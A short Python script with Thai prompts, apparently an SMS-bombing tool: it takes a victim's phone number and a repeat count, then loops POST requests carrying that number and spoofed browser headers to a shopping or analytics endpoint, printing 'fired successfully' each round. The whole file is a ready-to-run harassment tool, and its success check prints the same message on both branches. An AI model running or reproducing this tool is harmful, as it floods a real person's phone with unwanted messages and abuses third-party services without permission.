import requests,time

print("""
      
░██████╗███╗░░░███╗░██████╗
██╔════╝████╗░████║██╔════╝
╚█████╗░██╔████╔██║╚█████╗░
░╚═══██╗██║╚██╔╝██║░╚═══██╗
██████╔╝██║░╚═╝░██║██████╔╝
╚═════╝░╚═╝░░░░░╚═╝╚═════╝░
        
""")

no = input('ตัวอย่าง : 08xx\n[🎭] เบอร์: ')
jml = int(input('[🎭] จำนวน: '))

heder = {'Host': 'www.shopat24.com',
'content-length': '22',
'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36',
'accept-language': 'th-TH,th;q=0.9,en;q=0.8',
}
        
data = {"phoneNumber": f"{no}","language":"th"}


print("\n[กำลังยิง]")
for i in range(jml):
      sec = requests.post('https://log.api.useinsider.com/v1/collect', headers=heder, json=data)
      if 'eror' in sec.text:
           print(f'{i+1}. [+]ยิงสำเร็จ {no}')
      else:
           print(f'{i+1}. [+]ยิงสำเร็จ {no}')
      time.sleep(2.0)
      
#เครดิตSCK
